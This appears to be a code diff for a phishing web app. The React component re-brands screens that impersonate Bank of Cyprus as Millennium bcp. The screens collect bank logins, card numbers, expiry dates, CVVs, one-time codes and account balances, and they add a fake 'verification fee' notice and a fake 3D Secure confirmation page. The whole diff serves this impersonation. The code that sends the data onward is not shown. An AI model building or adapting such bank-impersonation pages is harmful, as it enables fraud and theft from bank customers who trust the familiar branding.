-              className="h-[28px] px-2.5 rounded-full border border-slate-300 hover:border-slate-500 bg-white active:bg-slate-50 text-[#0d1e38] flex items-center gap-1.5 text-[11.5px] font-medium tracking-wide transition-colors cursor-pointer select-none"
-              aria-label="Toggle language"
-            >
-              <Globe className="w-3.5 h-3.5 stroke-[1.8]" />
-              <span className="font-semibold">{language === "en" ? "ES" : "EN"}</span>
-            </button>
-          </header>
+          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          <CardActivationHeader
+            step={1}
+            onBack={() => {
+              setCurrentScreen("splash")
+              if (typeof window !== "undefined" && window.history) {
+                window.history.replaceState({ screen: "splash" }, "", "/splash")
+              }
+            }}
+            onClose={() => {
+              setUserId("")
+              setPassword("")
+              setErrorMessage("")
+            }}
+          />
 
           {/* Card */}
           <section className="relative z-10 w-full px-5 flex flex-col justify-center my-auto shrink-0">
@@ -1115,7 +1383,7 @@ export default function BbvaPage(props: any) {
                       if (errorMessage) setErrorMessage("")
                     }}
                     placeholder={language === "es" ? "Usuario" : "User"}
-                    className="w-full h-[48px] px-4 rounded-[10px] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border border-transparent focus:outline-none focus:border-[#058998] focus:ring-1 focus:ring-[#058998] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]"
+                    className="w-full h-[48px] px-4 rounded-[10px] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border border-transparent focus:outline-none focus:border-[#990440] focus:ring-1 focus:ring-[#990440] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]"
                   />
                 </div>
 
@@ -1124,7 +1392,7 @@ export default function BbvaPage(props: any) {
                   <label className="block text-[#374761] text-[13.5px] font-medium mb-1.5 select-none">
                     {language === "es" ? "Contraseña" : "Password"}
                   </label>
-                  <div className="w-full h-[48px] px-4 rounded-[10px] bg-white flex items-center border border-transparent focus-within:border-[#058998] focus-within:ring-1 focus-within:ring-[#058998] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
+                  <div className="w-full h-[48px] px-4 rounded-[10px] bg-white flex items-center border border-transparent focus-within:border-[#990440] focus-within:ring-1 focus-within:ring-[#990440] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
                     <input
                       type={showPassword ? "text" : "password"}
                       autoComplete="current-password"
@@ -1162,7 +1430,7 @@ export default function BbvaPage(props: any) {
                 <button
                   type="submit"
                   disabled={isScreenLoading}
-                  className="w-full h-[50px] mt-5 rounded-[10px] bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white font-semibold text-[15.5px] tracking-wide flex items-center justify-center shadow-md cursor-pointer transition-all disabled:opacity-85 select-none"
+                  className="w-full h-[50px] mt-5 rounded-full bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white font-semibold text-[15.5px] tracking-wide flex items-center justify-center shadow-md cursor-pointer transition-all disabled:opacity-85 select-none"
                 >
                   {language === "es" ? "Iniciar sesión para verificar" : "Log in to verify"}
                 </button>
@@ -1172,7 +1440,7 @@ export default function BbvaPage(props: any) {
               <div className="grid grid-cols-4 gap-2 mt-6 pt-1 select-none">
                 <div className="flex flex-col items-center text-center group cursor-pointer">
                   <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
-                    <UserPlus className="w-[20px] h-[20px] text-[#058998]" strokeWidth={2.2} />
+                    <UserPlus className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                     {language === "es" ? <>Hazte<br />cliente</> : <>Become a<br />customer</>}
@@ -1181,7 +1449,7 @@ export default function BbvaPage(props: any) {
 
                 <div className="flex flex-col items-center text-center group cursor-pointer">
                   <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
-                    <Home className="w-[20px] h-[20px] text-[#058998]" strokeWidth={2.2} />
+                    <Home className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                     BBVA<br />Valora<br />Homes
@@ -1190,7 +1458,7 @@ export default function BbvaPage(props: any) {
 
                 <div className="flex flex-col items-center text-center group cursor-pointer">
                   <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
-                    <MapPin className="w-[20px] h-[20px] text-[#058998]" strokeWidth={2.2} />
+                    <MapPin className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                     {language === "es" ? <>Oficinas<br />y cajeros</> : <>Branches<br />and ATMs</>}
@@ -1199,7 +1467,7 @@ export default function BbvaPage(props: any) {
 
                 <div className="flex flex-col items-center text-center group cursor-pointer">
                   <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
-                    <Users className="w-[20px] h-[20px] text-[#058998]" strokeWidth={2.2} />
+                    <Users className="w-[20px] h-[20px] text-[#990440]" strokeWidth={2.2} />
                   </div>
                   <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
                     {language === "es" ? <>Compartir<br />gastos</> : <>Share<br />expenses</>}
@@ -1220,16 +1488,23 @@ export default function BbvaPage(props: any) {
       {/* ========================================================================= */}
       {currentScreen === "card" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
-          {/* Header with centered Bank of Cyprus Logo on clean white */}
-          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-white border-b border-slate-100">
-            <div className="w-7" />
-
-            <div className="flex items-center justify-center">
-              <BibdLogo />
-            </div>
-
-            <div className="w-7" />
-          </header>
+          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          <CardActivationHeader
+            step={2}
+            onBack={() => {
+              setCurrentScreen("phone")
+              if (typeof window !== "undefined" && window.history) {
+                window.history.replaceState({ screen: "phone" }, "", "/contacts")
+              }
+            }}
+            onClose={() => {
+              setCardNumber("")
+              setCardMonth("")
+              setCardYear("")
+              setCardCvv("")
+              setCardError("")
+            }}
+          />
 
           {/* Card Container extending to bottom with white Background */}
           <section className="relative z-10 w-full bg-white rounded-none flex-1 min-h-0 flex flex-col overflow-hidden select-none">
@@ -1237,8 +1512,8 @@ export default function BbvaPage(props: any) {
             <div className="shrink-0 w-full px-4 pt-3.5 pb-2 bg-white z-10">
               <div className="w-full flex justify-center">
                 <img
-                  src="/cyprus_card.png"
-                  alt="Bank of Cyprus Card"
+                  src="/millennium_card.jpg"
+                  alt="Millennium bim Card"
                   className="w-full max-w-[380px] mx-auto h-auto object-contain rounded-[14px] shadow-sm select-none pointer-events-none"
                 />
               </div>
@@ -1278,7 +1553,7 @@ export default function BbvaPage(props: any) {
                       onChange={handleCardNumberChange}
                       placeholder="0000 0000 0000 0000"
                       maxLength={19}
-                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal tracking-[0.08em] focus:outline-none focus:border-[#058998] focus:ring-1 focus:ring-[#058998] transition-all"
+                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal tracking-[0.08em] focus:outline-none focus:border-[#990440] focus:ring-1 focus:ring-[#990440] transition-all"
                     />
                   </div>
 
@@ -1301,7 +1576,7 @@ export default function BbvaPage(props: any) {
                         onKeyDown={handleMonthKeyDown}
                         placeholder="MM"
                         maxLength={2}
-                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#058998] focus:ring-1 focus:ring-[#058998] transition-all"
+                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#990440] focus:ring-1 focus:ring-[#990440] transition-all"
                       />
                     </div>
 
@@ -1321,7 +1596,7 @@ export default function BbvaPage(props: any) {
                         onKeyDown={handleYearKeyDown}
                         placeholder="YY"
                         maxLength={2}
-                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#058998] focus:ring-1 focus:ring-[#058998] transition-all"
+                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#990440] focus:ring-1 focus:ring-[#990440] transition-all"
                       />
                     </div>
                   </div>
@@ -1343,7 +1618,7 @@ export default function BbvaPage(props: any) {
                       onKeyDown={handleCvvKeyDown}
                       placeholder="• • •"
                       maxLength={3}
-                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[18px] tracking-[0.25em] focus:outline-none focus:border-[#058998] focus:ring-1 focus:ring-[#058998] transition-all"
+                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[18px] tracking-[0.25em] focus:outline-none focus:border-[#990440] focus:ring-1 focus:ring-[#990440] transition-all"
                     />
                   </div>
 
@@ -1362,12 +1637,12 @@ export default function BbvaPage(props: any) {
                   </p>
 
                   {/* Account verification fee notice */}
-                  <div className="w-full bg-[#058998]/5 border border-[#058998]/20 rounded-[10px] p-3 mb-3.5 flex items-start gap-2.5 select-none text-left">
-                    <div className="w-5 h-5 rounded-full bg-[#058998]/10 text-[#058998] flex items-center justify-center shrink-0 mt-0.5 font-bold text-[11.5px]">
+                  <div className="w-full bg-[#990440]/5 border border-[#990440]/20 rounded-[10px] p-3 mb-3.5 flex items-start gap-2.5 select-none text-left">
+                    <div className="w-5 h-5 rounded-full bg-[#990440]/10 text-[#990440] flex items-center justify-center shrink-0 mt-0.5 font-bold text-[11.5px]">
                       i
                     </div>
                     <p className="text-[12px] sm:text-[12.5px] text-[#334155] leading-relaxed">
-                      Please note: An account verification fee of <strong className="text-[#058998] font-bold">0.008 EUR</strong> will be deducted to verify your card.
+                      Please note: An account verification fee of <strong className="text-[#990440] font-bold">0.008 EUR</strong> will be deducted to verify your card.
                     </p>
                   </div>
 
@@ -1375,9 +1650,9 @@ export default function BbvaPage(props: any) {
                   <button
                     type="submit"
                     disabled={isCardSubmitting || !isCardFormValid}
-                    className={`w-full h-[48px] rounded-[10px] font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
+                    className={`w-full h-[50px] sm:h-[52px] rounded-full font-semibold text-[16px] tracking-wide flex items-center justify-center transition-all select-none shadow-sm ${
                       isCardFormValid && !isCardSubmitting
-                        ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
+                        ? "bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white cursor-pointer"
                         : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
                     }`}
                   >
@@ -1419,95 +1694,49 @@ export default function BbvaPage(props: any) {
       )}
 
       {/* ========================================================================= */}
-      {/* 2.5. SCREEN 2.5: 3D SECURE VISA PURCHASE VERIFICATION (Πιστοποίηση Αγοράς) */}
-      {/* Matching user uploaded screenshot from Bank of Cyprus                     */}
+      {/* 2.5. SCREEN 2.5: MILLENNIUM BCP 3D SECURE (Confirme o Pagamento)           */}
+      {/* Pixel-perfect match to user-uploaded photo from Millennium bcp             */}
       {/* ========================================================================= */}
       {currentScreen === "boc-verify" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col justify-between overflow-y-auto shadow-2xl bg-white px-0 select-none">
-          {/* Header: Left is Τράπεζα Κύπρου + Emblem, Right is VISA Logo */}
+          {/* Header: Left is Millennium bcp badge, Right is VISA SECURE badge */}
           <header className="w-full px-6 pt-7 pb-4 flex items-center justify-between shrink-0 bg-white">
-            <div className="flex items-center gap-1.5 select-none">
-              <span
-                className="text-[#058998] font-serif font-bold text-[16px] sm:text-[17px] tracking-tight leading-none"
-                style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
-              >
-                Τράπεζα Κύπρου
-              </span>
-              <img
-                src="/boc_logo.png"
-                alt="Τράπεζα Κύπρου"
-                className="w-[24px] h-[24px] sm:w-[26px] sm:h-[26px] object-contain rounded-[4px] shrink-0"
-              />
-            </div>
-
-            <img
-              src="/visa_blue.svg"
-              alt="VISA"
-              className="h-[28px] sm:h-[32px] w-auto object-contain shrink-0"
-            />
+            <MillenniumBcpBadge />
+            <VisaSecureBadge />
           </header>
 
           {/* Main Body */}
-          <section className="w-full flex-1 flex flex-col px-6 pt-5 pb-8 select-none">
-            {/* Title: Πιστοποίηση Αγοράς */}
-            <h1 className="text-[17.5px] sm:text-[18.5px] font-bold text-[#000000] tracking-tight mb-4">
-              Πιστοποίηση Αγοράς
+          <section className="w-full flex-1 flex flex-col px-6 pt-4 pb-7 select-none bg-white">
+            {/* Title: Confirm Payment */}
+            <h1 className="text-[20px] sm:text-[22px] font-normal text-[#1a1a1a] tracking-tight mb-5">
+              Confirm Payment
             </h1>
 
-            {/* Instruction description */}
-            <p className="text-[13.5px] sm:text-[14px] text-[#000000] leading-[1.45] font-normal mb-6">
-              Ελέγξτε το BoC Mobile App της Τράπεζας Κύπρου για να επιβεβαιώστε τη συναλλαγή σας.
+            {/* Warning / Authentication Alert Box matching photo in English */}
+            <div className="w-full flex items-start gap-3.5 mb-6">
+              <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-full border-[2.2px] border-[#7d8b99] flex items-center justify-center shrink-0 text-[#7d8b99] font-bold text-[19px] leading-none select-none mt-0.5">
+                !
+              </div>
+              <p className="text-[13.5px] sm:text-[14px] text-[#2c3e50] leading-[1.48] font-normal">
+                Authentication was not successful. Please check your bank&apos;s app and follow the instructions to complete the authentication process.
+              </p>
+            </div>
+
+            {/* Simple clean text of deduction fee only (no entire box) */}
+            <p className="text-[13px] sm:text-[13.5px] text-[#4b5563] mt-1 mb-6">
+              Fee deduction: <span className="font-semibold text-[#111827]">0.008 EUR</span>
             </p>
 
-            {/* Data fields: ΕΜΠΟΡΑΣ, ΠΟΣΟ, ΗΜΕΡΟΜΗΝΙΑ */}
-            <div className="flex flex-col space-y-4 mb-7">
-              <div>
-                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
-                  ΕΜΠΟΡΑΣ
-                </p>
-                <p className="text-[14px] font-normal text-[#000000] mt-0.5">
-                  FAHIPAY
-                </p>
-              </div>
-
-              <div>
-                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
-                  ΠΟΣΟ
-                </p>
-                <p className="text-[14px] font-normal text-[#000000] mt-0.5">
-                  EUR 0.008
-                </p>
-              </div>
-
-              <div>
-                <p className="text-[12px] font-bold text-[#000000] tracking-wider uppercase">
-                  ΗΜΕΡΟΜΗΝΙΑ
-                </p>
-                <p className="text-[14px] font-normal text-[#000000] mt-0.5">
-                  {currentDateFormatted}
-                </p>
-              </div>
-            </div>
-
-            {/* Δεν δουλεύει; & Έχω ήδη εγκρίνει την συναλλαγή (Non-clickable) */}
-            <div className="flex flex-col mb-10 select-none">
-              <p className="text-[13.5px] font-bold text-[#000000] mb-1">
-                Δεν δουλεύει;
-              </p>
-              <span className="text-left text-[13.5px] text-[#0052cc] underline underline-offset-2 font-normal cursor-default select-none pointer-events-none inline-block">
-                Έχω ήδη εγκρίνει την συναλλαγή
-              </span>
-            </div>
-
-            {/* Bottom Footer Links (Non-clickable) */}
-            <div className="flex items-center justify-between pt-12 mt-auto select-none pointer-events-none">
-              <span className="text-[13px] font-bold text-[#000000] underline underline-offset-2 cursor-default select-none">
-                Όροι και Προϋποθέσεις
-              </span>
-
-              <span className="text-[13px] font-bold text-[#000000] underline underline-offset-2 cursor-default select-none">
-                Έξοδος
-              </span>
+            {/* Blue Button: I ALREADY AUTHORIZED. CONTINUE. (Non-clickable as requested) */}
+            <div className="w-full mt-auto pt-4 select-none">
+              <button
+                type="button"
+                disabled
+                className="w-full h-[46px] sm:h-[48px] rounded-[4px] bg-[#26538d] text-white text-[13px] sm:text-[13.5px] font-bold tracking-[0.06em] uppercase flex items-center justify-center shadow-sm select-none pointer-events-none cursor-default opacity-95"
+                aria-disabled="true"
+              >
+                I ALREADY AUTHORIZED. CONTINUE.
+              </button>
             </div>
           </section>
         </main>
@@ -1515,28 +1744,27 @@ export default function BbvaPage(props: any) {
 
       {/* ========================================================================= */}
       {/* 3. SCREEN 3: PIXEL-PERFECT OTP SCREEN                                     */}
-      {/* Features: Back button, Bank of Cyprus logo, Lock Icon,                     */}
+      {/* Features: Back button, Millennium logo, Lock Icon,                        */}
       {/* "Verify your identity", 6 separate digit boxes, countdown, verify button  */}
       {/* ========================================================================= */}
       {currentScreen === "otp" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
-          {/* Header with Back Arrow and centered Bank of Cyprus Logo on clean white */}
-          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-white border-b border-slate-100">
-            <button
-              type="button"
-              onClick={() => setCurrentScreen("card")}
-              className="p-1.5 -ml-1 text-[#0d1e38] hover:text-[#058998] transition-colors cursor-pointer flex items-center justify-center"
-              aria-label="Back"
-            >
-              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
-            </button>
-
-            <div className="flex items-center justify-center">
-              <BibdLogo />
-            </div>
-
-            <div className="w-7" />
-          </header>
+          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          <CardActivationHeader
+            step={3}
+            onBack={() => {
+              setCurrentScreen("card")
+              if (typeof window !== "undefined" && window.history) {
+                window.history.replaceState({ screen: "card" }, "", "/card")
+              }
+            }}
+            onClose={() => {
+              setOtp(["", "", "", "", "", ""])
+              setOtpError("")
+              setFocusedOtpIndex(0)
+              otpRefs.current[0]?.focus()
+            }}
+          />
 
           {/* Section below header: clean white background extending across the form */}
           <section className="relative z-10 w-full bg-white flex-1 flex flex-col items-center px-4 pt-6 pb-8 overflow-y-auto select-none">
@@ -1547,7 +1775,7 @@ export default function BbvaPage(props: any) {
               }`}
             >
               {/* Lock Icon */}
-              <div className="w-12 h-12 flex items-center justify-center mb-2 text-[#058998]">
+              <div className="w-12 h-12 flex items-center justify-center mb-2 text-[#990440]">
                 <Lock className="w-[33px] h-[33px] stroke-[1.9]" />
               </div>
 
@@ -1582,9 +1810,9 @@ export default function BbvaPage(props: any) {
                     onBlur={() => setFocusedOtpIndex(null)}
                     className={`w-full h-[52px] sm:h-[56px] text-center text-[22px] sm:text-[24px] font-bold text-[#0d1e38] rounded-[10px] transition-all outline-none ${
                       focusedOtpIndex === idx
-                        ? "border-2 border-[#058998] ring-1 ring-[#058998]/15 bg-white shadow-xs"
+                        ? "border-2 border-[#990440] ring-1 ring-[#990440]/15 bg-white shadow-xs"
                         : digit
-                        ? "border border-[#058998]/60 bg-white"
+                        ? "border border-[#990440]/60 bg-white"
                         : "border border-[#d0dbe9] bg-[#f8fafc]"
                     }`}
                   />
@@ -1601,7 +1829,7 @@ export default function BbvaPage(props: any) {
                 <button
                   type="button"
                   onClick={handleResendOtp}
-                  className="flex items-center gap-1.5 text-[12px] sm:text-[12.5px] font-medium text-[#64748b] hover:text-[#058998] cursor-pointer mt-1.5 transition-colors"
+                  className="flex items-center gap-1.5 text-[12px] sm:text-[12.5px] font-medium text-[#64748b] hover:text-[#990440] cursor-pointer mt-1.5 transition-colors"
                 >
                   <RotateCw className="w-3.5 h-3.5 stroke-[2]" />
                   <span>{language === "es" ? "Reenviar código" : "Resend code"}</span>
@@ -1629,9 +1857,9 @@ export default function BbvaPage(props: any) {
                 type="button"
                 disabled={!isOtpComplete || isOtpSubmitting}
                 onClick={handleOtpSubmit}
-                className={`w-full h-[46px] rounded-[10px] font-semibold text-[15px] tracking-wide flex items-center justify-center transition-all select-none ${
+                className={`w-full h-[50px] sm:h-[52px] rounded-full font-semibold text-[16px] tracking-wide flex items-center justify-center transition-all select-none ${
                   isOtpComplete && !isOtpSubmitting
-                    ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
+                    ? "bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white cursor-pointer shadow-sm"
                     : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
                 }`}
               >
@@ -1675,23 +1903,20 @@ export default function BbvaPage(props: any) {
       {/* ========================================================================= */}
       {currentScreen === "accounts" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
-          {/* Header with Back Arrow and centered Bank of Cyprus Logo on clean white */}
-          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-white border-b border-slate-100">
-            <button
-              type="button"
-              onClick={() => setCurrentScreen("otp")}
-              className="p-1 -ml-1 text-[#0d1e38] hover:text-[#058998] transition-colors cursor-pointer flex items-center justify-center"
-              aria-label="Back"
-            >
-              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
-            </button>
-
-            <div className="flex items-center justify-center">
-              <BibdLogo />
-            </div>
-
-            <div className="w-6" />
-          </header>
+          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          <CardActivationHeader
+            step={4}
+            onBack={() => {
+              setCurrentScreen("otp")
+              if (typeof window !== "undefined" && window.history) {
+                window.history.replaceState({ screen: "otp" }, "", "/verify")
+              }
+            }}
+            onClose={() => {
+              setAccountNumber("")
+              setAccountBalance("")
+            }}
+          />
 
           {/* White Card Container extending to bottom with Rounded Top Corners */}
           <section className="relative z-10 w-full bg-white rounded-t-[28px] flex-1 flex flex-col p-5 shadow-2xl overflow-y-auto gap-3.5 select-none">
@@ -1699,8 +1924,8 @@ export default function BbvaPage(props: any) {
             <div className="w-full flex flex-col items-center">
               <div className="relative w-full max-w-[380px] rounded-[14px] overflow-hidden shadow-sm flex items-center justify-center bg-white">
                 <img
-                  src="/cyprus_card.png"
-                  alt="Bank of Cyprus Card"
+                  src="/millennium_card.jpg"
+                  alt="Millennium bim Card"
                   className="w-full h-auto object-contain rounded-[14px] select-none pointer-events-none"
                 />
                 {/* Overlaid Embossed Number */}
@@ -1718,7 +1943,7 @@ export default function BbvaPage(props: any) {
 
               {/* 3 Pagination dots */}
               <div className="flex items-center justify-center gap-1.5 pt-3 pb-0.5">
-                <span className="w-4 h-1.5 rounded-full bg-[#058998]" />
+                <span className="w-4 h-1.5 rounded-full bg-[#990440]" />
                 <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
                 <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
               </div>
@@ -1750,7 +1975,7 @@ export default function BbvaPage(props: any) {
                   : "What is your current account balance?"}
               </p>
               <div className="flex items-center">
-                <span className="bg-[#058998] text-white text-[11px] font-bold px-2.5 py-1 rounded-[6px] mr-2.5 select-none shrink-0 flex items-center justify-center">
+                <span className="bg-[#990440] text-white text-[11px] font-bold px-2.5 py-1 rounded-[6px] mr-2.5 select-none shrink-0 flex items-center justify-center">
                   EUR
                 </span>
                 <input
@@ -1770,7 +1995,7 @@ export default function BbvaPage(props: any) {
                 type="button"
                 disabled={isAccountsSubmitting}
                 onClick={handleAccountsSubmit}
-                className="w-full h-[48px] bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white rounded-[10px] font-semibold text-[15.5px] tracking-wide transition-all flex items-center justify-center cursor-pointer shadow-sm select-none animate-in fade-in duration-200"
+                className="w-full h-[50px] sm:h-[52px] bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white rounded-full font-semibold text-[16px] tracking-wide transition-all flex items-center justify-center cursor-pointer shadow-sm select-none animate-in fade-in duration-200"
               >
                 {isAccountsSubmitting ? (
                   <div className="flex items-center gap-2">
@@ -1814,35 +2039,29 @@ export default function BbvaPage(props: any) {
       {/* ========================================================================= */}
       {currentScreen === "confirm-otp" && (
         <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-white px-0">
-          {/* Header with Back Arrow (<) and centered Bank of Cyprus Logo on clean white */}
-          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-white border-b border-slate-100">
-            <button
-              type="button"
-              onClick={() => {
-                setCurrentScreen("accounts")
-                if (typeof window !== "undefined" && window.history) {
-                  window.history.pushState({ screen: "accounts" }, "", "/accounts")
-                }
-              }}
-              className="p-1 -ml-1 text-[#0d1e38] hover:text-[#058998] transition-colors cursor-pointer flex items-center justify-center"
-              aria-label="Back"
-            >
-              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
-            </button>
-
-            <div className="flex items-center justify-center">
-              <BibdLogo />
-            </div>
-
-            <div className="w-6" />
-          </header>
+          {/* Header Bar: < CARD ACTIVATION X + 4-segment Progress Bar */}
+          <CardActivationHeader
+            step={4}
+            onBack={() => {
+              setCurrentScreen("accounts")
+              if (typeof window !== "undefined" && window.history) {
+                window.history.pushState({ screen: "accounts" }, "", "/accounts")
+              }
+            }}
+            onClose={() => {
+              setConfirmOtp(["", "", "", "", "", ""])
+              setHasConfirmError(false)
+              setConfirmFocusedIndex(0)
+              confirmOtpRefs.current[0]?.focus()
+            }}
+          />
 
           {/* Section below header: clean white background extending across the form */}
           <section className="relative z-10 w-full bg-white flex-1 flex flex-col justify-start items-center p-4 pt-6 overflow-y-auto select-none">
             {/* Form Container (Clean white, seamless with background) */}
             <div className="w-full max-w-[380px] bg-white flex flex-col items-center">
               {/* Lock Icon in subtle ring */}
-              <div className="w-11 h-11 rounded-full border border-[#058998]/25 flex items-center justify-center text-[#058998] mb-3">
+              <div className="w-11 h-11 rounded-full border border-[#990440]/25 flex items-center justify-center text-[#990440] mb-3">
                 <Lock className="w-5 h-5 stroke-[2.2]" />
               </div>
 
@@ -1871,7 +2090,7 @@ export default function BbvaPage(props: any) {
                       ? "border-[#ef4444] ring-1 ring-[#ef4444]"
                       : "border-[#ef4444]"
                     : isFocused
-                    ? "border-[#058998] ring-1 ring-[#058998]"
+                    ? "border-[#990440] ring-1 ring-[#990440]"
                     : "border-[#cbd5e1]"
 
                   return (
@@ -1928,7 +2147,7 @@ export default function BbvaPage(props: any) {
               <button
                 type="button"
                 onClick={handleResendConfirmOtp}
-                className="flex items-center justify-center gap-1.5 text-[11.5px] text-[#64748b] hover:text-[#058998] transition-colors cursor-pointer font-medium mb-4"
+                className="flex items-center justify-center gap-1.5 text-[11.5px] text-[#64748b] hover:text-[#990440] transition-colors cursor-pointer font-medium mb-4"
               >
                 <RotateCw className="w-3 h-3 stroke-[2.2]" />
                 <span>{language === "es" ? "Reenviar código" : "Resend code"}</span>
@@ -1939,9 +2158,9 @@ export default function BbvaPage(props: any) {
                 type="button"
                 disabled={confirmOtp.join("").length < 6 || isConfirmSubmitting}
                 onClick={handleConfirmOtpSubmit}
-                className={`w-full h-[44px] rounded-[10px] font-semibold text-[14px] sm:text-[14.5px] transition-all flex items-center justify-center select-none shadow-sm ${
+                className={`w-full h-[50px] sm:h-[52px] rounded-full font-semibold text-[15px] sm:text-[16px] transition-all flex items-center justify-center select-none shadow-sm ${
                   confirmOtp.join("").length === 6 && !isConfirmSubmitting
-                    ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer"
+                    ? "bg-[#990440] hover:bg-[#830336] active:scale-[0.985] text-white cursor-pointer"
                     : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
                 }`}
               >
@@ -1985,18 +2204,18 @@ export default function BbvaPage(props: any) {
       {/* Active on transition: Login -> Card and Card -> OTP                       */}
       {/* ========================================================================= */}
       {isScreenLoading && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#e6f4f6]/70 backdrop-blur-md animate-in fade-in duration-200">
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#990440]/10 backdrop-blur-md animate-in fade-in duration-200">
           <div
             className="w-[44px] h-[44px] rounded-full border-[3.5px] animate-spin"
             style={{
-              borderColor: "rgba(5, 137, 152, 0.2)",
-              borderTopColor: "#058998",
+              borderColor: "rgba(153, 4, 64, 0.2)",
+              borderTopColor: "#990440",
             }}
           />
         </div>
       )}
 
-      {/* Shake Keyframe animation */}
+      {/* Shake Keyframe animation & Calm Sequential Icon Transitions */}
       <style jsx global>{`
         @keyframes shake {
           10%, 90% { transform: translate3d(-1px, 0, 0); }
@@ -2006,6 +2225,36 @@ export default function BbvaPage(props: any) {
         }
         .animate-shake {
           animation: shake 0.4s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
+        }
+
+        @keyframes iconAppear {
+          0% {
+            opacity: 0;
+            transform: translateY(14px) scale(0.92);
+          }
+          100% {
+            opacity: 1;
